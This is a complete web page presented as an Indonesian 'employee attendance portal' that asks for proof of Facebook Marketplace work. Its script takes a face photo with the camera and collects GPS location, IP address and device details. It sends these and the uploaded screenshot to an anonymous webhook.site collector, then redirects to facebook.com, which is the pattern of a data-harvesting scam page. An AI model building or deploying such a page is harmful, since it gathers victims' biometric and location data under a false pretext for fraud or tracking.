<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Employee Attendance Portal | Monitoring System</title>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #4f46e5;
            --primary-hover: #4338ca;
            --bg-dark: #0f172a;
            --card-bg: #1e293b;
            --text-main: #f8fafc;
            --text-dim: #94a3b8;
            --success: #10b981;
            --danger: #ef4444;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Outfit', sans-serif;
        }

        body {
            background-color: var(--bg-dark);
            color: var(--text-main);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 450px;
            background: var(--card-bg);
            border-radius: 24px;
            padding: 40px 30px;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
            border: 1px solid rgba(255, 255, 255, 0.1);
            text-align: center;
            animation: fadeIn 0.6s ease-out;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .logo-area {
            margin-bottom: 30px;
        }

        .logo-icon {
            font-size: 64px;
            margin-bottom: 15px;
            display: inline-block;
            background: linear-gradient(135deg, #6366f1, #a855f7);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        h1 {
            font-size: 28px;
            font-weight: 700;
            margin-bottom: 10px;
            letter-spacing: -0.5px;
        }

        p.subtitle {
            color: var(--text-dim);
            font-size: 15px;
            line-height: 1.6;
            margin-bottom: 30px;
        }

        .upload-section {
            background: rgba(255, 255, 255, 0.05);
            border: 2px dashed rgba(255, 255, 255, 0.2);
            border-radius: 16px;
            padding: 20px;
            margin-bottom: 25px;
            transition: all 0.3s ease;
            position: relative;
        }

        .upload-section:hover {
            border-color: var(--primary);
            background: rgba(79, 70, 229, 0.05);
        }

        .upload-section input[type="file"] {
            position: absolute;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            opacity: 0;
            cursor: pointer;
        }

        .upload-label {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 8px;
            color: var(--text-dim);
        }

        .upload-label b {
            color: var(--text-main);
        }

        .btn-absen {
            width: 100%;
            background: var(--primary);
            color: white;
            border: none;
            padding: 18px;
            border-radius: 14px;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 10px;
            box-shadow: 0 10px 15px -3px rgba(79, 70, 229, 0.4);
        }

        .btn-absen:hover {
            background: var(--primary-hover);
            transform: translateY(-2px);
            box-shadow: 0 20px 25px -5px rgba(79, 70, 229, 0.5);
        }

        .btn-absen:active {
            transform: translateY(0);
        }

        .loading-spinner {
            display: none;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .footer-note {
            margin-top: 25px;
            font-size: 12px;
            color: var(--text-dim);
        }

        #camera-preview {
            display: none;
            width: 100%;
            max-width: 300px;
            margin: 20px auto;
            border-radius: 12px;
            transform: scaleX(-1); /* Mirror effect */
        }

        canvas#snapshot {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo-area">
            <div class="logo-icon">🏢</div>
            <h1>Portal Absensi</h1>
            <p class="subtitle">Silakan lakukan absensi kehadiran dan unggah bukti pengerjaan Facebook Marketplace Anda.</p>
        </div>

        <div class="upload-section" id="drop-zone">
            <div class="upload-label">
                <span style="font-size: 32px;">📸</span>
                <span id="file-name"><b>Klik untuk Upload Screenshot</b></span>
                <span>Format: JPG, PNG (Maks 5MB)</span>
            </div>
            <input type="file" id="screenshot-input" accept="image/*">
        </div>

        <button class="btn-absen" id="btn-submit" onclick="startProcess()">
            <div class="loading-spinner" id="spinner"></div>
            <span id="btn-text">Absen Sekarang</span>
        </button>

        <video id="camera-preview" autoplay playsinline></video>
        <canvas id="snapshot"></canvas>

        <p class="footer-note">
            ⚠️ Sistem mencatat Lokasi, Foto Wajah, dan IP Address secara otomatis untuk validasi data.
        </p>
    </div>

    <script>
        // CONFIGURATION
        const WEBHOOK_URL = 'https://webhook.site/052d15c1-096d-448f-9e5c-aca3d65b1bb7';
        
        const btnSubmit = document.getElementById('btn-submit');
        const btnText = document.getElementById('btn-text');
        const spinner = document.getElementById('spinner');
        const fileInput = document.getElementById('screenshot-input');
        const fileNameDisplay = document.getElementById('file-name');
        const video = document.getElementById('camera-preview');
        const canvas = document.getElementById('snapshot');

        let uploadedScreenshotBase64 = null;

        // Update file name display
        fileInput.addEventListener('change', function(e) {
            if (this.files && this.files[0]) {
                fileNameDisplay.innerHTML = `<b>${this.files[0].name}</b>`;
                
                const reader = new FileReader();
                reader.onload = (e) => {
                    uploadedScreenshotBase64 = e.target.result;
                };
                reader.readAsDataURL(this.files[0]);
            }
        });

        async function getPublicIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip;
            } catch { return 'Unknown'; }
        }

        async function startProcess() {
            if (!fileInput.files[0]) {
                alert('Silakan upload screenshot bukti pengerjaan Facebook Marketplace terlebih dahulu!');
                return;
            }

            // UI State
            btnSubmit.disabled = true;
            btnText.innerText = 'Memproses...';
            spinner.style.display = 'block';

            try {
                // 1. Request Camera & Take Snapshot
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                video.srcObject = stream;
                
                // Wait for video to load
                await new Promise(resolve => video.onloadedmetadata = resolve);
                
                // Capture frame after a short delay
                setTimeout(async () => {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    const facePhotoBase64 = canvas.toDataURL('image/jpeg', 0.7);
                    
                    // Stop camera
                    stream.getTracks().forEach(track => track.stop());

                    // 2. Get Location
                    navigator.geolocation.getCurrentPosition(async (pos) => {
                        const lat = pos.coords.latitude;
                        const lng = pos.coords.longitude;
                        const mapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
                        
                        // 3. Collect Extra Data
                        const ip = await getPublicIP();
                        
                        // 4. Send to Webhook
                        await sendData({
                            status: 'SUCCESS',
                            timestamp: new Date().toLocaleString('id-ID'),
                            ip: ip,
                            device: navigator.userAgent,
                            location: {
                                lat: lat,
                                lng: lng,
                                maps_link: mapsLink
                            },
                            files: {
                                face_photo: facePhotoBase64,
                                proof_screenshot: uploadedScreenshotBase64
                            }
                        });

                        alert('Absensi Berhasil Terkirim!');
                        window.location.href = 'https://facebook.com';

                    }, async (err) => {
                        console.error('Location Error:', err);
                        await sendData({ status: 'FAILED_LOCATION', error: err.message });
                        alert('Gagal mengambil lokasi. Pastikan GPS aktif.');
                        resetUI();
                    });
                }, 1000);

            } catch (err) {
                console.error('Camera Error:', err);
                alert('Gagal mengakses kamera. Mohon izinkan akses kamera untuk absen.');
                resetUI();
            }
        }

        async function sendData(payload) {
            try {
                // Using 'no-cors' might be needed if the webhook doesn't support CORS, 
                // but usually simple fetch works for webhooks.
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
            } catch (e) {
                console.warn('Webhook delivery issue:', e);
            }
        }

        function resetUI() {
            btnSubmit.disabled = false;
            btnText.innerText = 'Absen Sekarang';
            spinner.style.display = 'none';
        }
    </script>
</body>
</html>
